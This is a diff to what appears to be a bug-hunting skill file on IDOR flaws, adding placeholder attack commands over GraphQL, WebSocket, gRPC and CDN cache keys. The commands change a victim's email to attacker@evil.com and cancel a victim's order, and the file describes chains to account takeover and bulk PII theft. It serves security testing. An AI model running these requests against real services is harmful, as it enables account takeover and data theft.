@@ -386,6 +386,32 @@ Cross-references:
 
 ## Related Skills & Chains
 
+### Phase X — Cross-Channel IDOR (GraphQL/WebSocket/gRPC)
+
+```bash
+# GraphQL IDOR — same mutation, different transport, no REST auth
+curl -sk -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"mutation { updateUser(id: VICTIM_ID, input: {email: \"attacker@evil.com\"}) { success } }"}'
+
+# WebSocket IDOR — actions over WS may skip REST middleware
+echo '{"type":"UPDATE_ORDER","payload":{"orderId":"VICTIM_ORDER_ID","status":"cancelled"}}' \
+  | wscat -c "wss://target.com/ws"
+
+# gRPC IDOR — reflection exposes internal methods
+grpcurl -plaintext target.com:50051 list
+grpcurl -plaintext target.com:50051 user.UserService/UpdateEmail \
+  -d '{"user_id":"VICTIM_ID","email":"attacker@evil.com"}'
+```
+
+### Phase Y — Cache Key Confusion IDOR
+
+```bash
+# CDN may cache user-specific responses under shared keys
+# Request VICTIM's data → CDN caches under your session → you read cached VICTIM data
+curl -sk "https://target.com/api/profile" -H "Authorization: Bearer YOUR_TOKEN" \
+  -H "X-Forwarded-Host: victim-cache-key"
+```
+
 - **`hunt-auth-bypass`** — Object-level authorization failure plus route-level auth absence is the canonical IDOR-amplifier. Chain primitive: missing `req.user.id` scoping in ORM query + missing middleware on legacy `/v1/` route = unauthenticated cross-tenant data read via direct ID substitution → bulk PII dump without any session at all.
 - **`hunt-ato`** — Profile-edit IDOR is the most direct path from "read someone's data" to "own their account." Chain primitive: `PATCH /api/users/{victim_uid}` accepts attacker's session + victim UID → set `email=attacker@evil.com` → trigger password reset → reset link arrives at attacker → full ATO without ever knowing victim credentials.
 - **`hunt-graphql`** — GraphQL resolvers without field-level authorization are IDOR-by-default; introspection hands you the schema. Chain primitive: `__schema` introspection → enumerate every mutation accepting `id:` argument → substitute victim IDs across `updateUser`, `deleteOrg`, `transferBilling` mutations → mass IDOR fan-out from one introspection query.
